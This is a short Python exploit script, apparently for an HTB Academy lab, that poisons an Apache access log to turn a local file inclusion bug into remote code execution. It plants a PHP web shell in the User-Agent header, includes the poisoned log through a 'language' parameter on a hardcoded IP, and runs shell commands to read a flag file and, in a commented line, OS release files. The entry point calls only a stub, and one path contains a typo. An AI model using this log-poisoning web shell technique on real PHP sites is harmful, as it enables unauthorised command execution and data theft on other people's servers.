#!/usr/bin/python3

import urllib.parse as parser
import requests


def execute_rce_nginx(payload: str, agent: str):
    # print(agent)
    agent_helper = "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
    base_url = f"http://188.166.174.107:31216/index.php?language={payload}"
    headers = {
            "User-Agent":agent
    }

    sess = requests.session()

    response = sess.get(url=base_url, headers=headers).text
    print("[*] Trying to retrieve the payload in user agents...")

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"

    # if you want to get the os version for the htb academy challenge
    # new_response = sess.get(url="http://188.166.174.107:31216/index.php?language=/var/log/apache2/access.log&cmd="+parser.quote("cat /etc/*-release"), headers=headers).text
    new_response = sess.get(url="http://188.166.174.107:31216/index.php?language=/var/log/apache2/access.log&cmd="+parser.quote("cat /exercise/flag.txt"), headers=headers).text

    print(new_response)




def new_implementation():

    implementation_value = None
    if implementation_value is not None:
        print("suck")

    else:
        print("Ready to hack")





def main():
    execute_rce_nginx(
            payload="/var/log/iapache2/access.log",
            agent="<?php system($_GET['cmd']); ?>"
    )




if __name__ == "__main__":
    new_implementation()
